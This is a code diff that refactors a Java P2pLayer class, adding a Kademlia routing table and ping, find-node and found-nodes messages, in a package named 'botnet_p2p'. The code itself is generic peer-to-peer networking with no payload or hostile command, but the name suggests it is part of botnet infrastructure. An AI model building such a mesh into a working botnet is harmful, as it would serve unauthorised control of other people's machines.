@@ -8,7 +8,7 @@ import botnet_p2p.protobuf_layer.Protobuf;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
-import java.io.IOException;
+import java.util.List;
 import java.util.concurrent.BlockingQueue;
 
 import static botnet_p2p.MessageOuterClass.Message;
@@ -17,28 +17,20 @@ import static botnet_p2p.MessageOuterClass.Message;
 public class P2pLayer {
     private static final Logger logger = LogManager.getLogger(P2pLayer.class);
 
-    private Protobuf protobuf;
     private MessageLayer messageLayer;
     private BlockingQueue<Message> decodedMessages;
 
     private BucketsList routingTable;
 
-    public P2pLayer(Protobuf protobuf,
-                    MessageLayer messageLayer,
-                    BlockingQueue<Message> decodedMessages) {
+    public P2pLayer(MessageLayer messageLayer,
+                    BlockingQueue<Message> decodedMessages,
+                    KademliaPeer me) {
         this.messageLayer = messageLayer;
-        this.protobuf = protobuf;
-
         this.decodedMessages = decodedMessages;
+
+        this.routingTable = new BucketsList(64, 20, me.getGuid());
     }
 
-    public void findNode(Peer bootstrapNode, KademliaPeer me) throws IOException {
-        messageLayer.send(
-                new Communication<>(
-                        protobuf.createFindNodeMessage(bootstrapNode, me),
-                        bootstrapNode
-                ));
-    }
 
     public BlockingQueue<Message> getDecodedMessagesQueue() {
         return decodedMessages;
@@ -46,5 +38,39 @@ public class P2pLayer {
 
     public BucketsList getRoutingTable() {
         return routingTable;
+    }
+
+    public void ping(KademliaPeer destination, KademliaPeer me) {
+        messageLayer.send(
+                new Communication<>(
+                        Protobuf.createPingMessage(destination, me),
+                        destination.toPeer()
+                ));
+
+    }
+
+    public void findNode(Peer bootstrapNode, KademliaPeer me) {
+        messageLayer.send(
+                new Communication<>(
+                        Protobuf.createFindNodeMessage(bootstrapNode, me),
+                        bootstrapNode
+                ));
+    }
+
+    public void pingResponse(KademliaPeer destination, KademliaPeer me) {
+        messageLayer.send(
+                new Communication<>(
+                        Protobuf.createPingResponseMessage(destination, me),
+                        destination.toPeer()
+                ));
+    }
+
+    public void foundNodes(KademliaPeer destination, KademliaPeer me, List<KademliaPeer> nearestPeers) {
+        messageLayer.send(
+                new Communication<>(
+                        Protobuf.createFoundNodesMessage(destination, me, nearestPeers),
+                        destination.toPeer()
+                ));
+
     }
 }
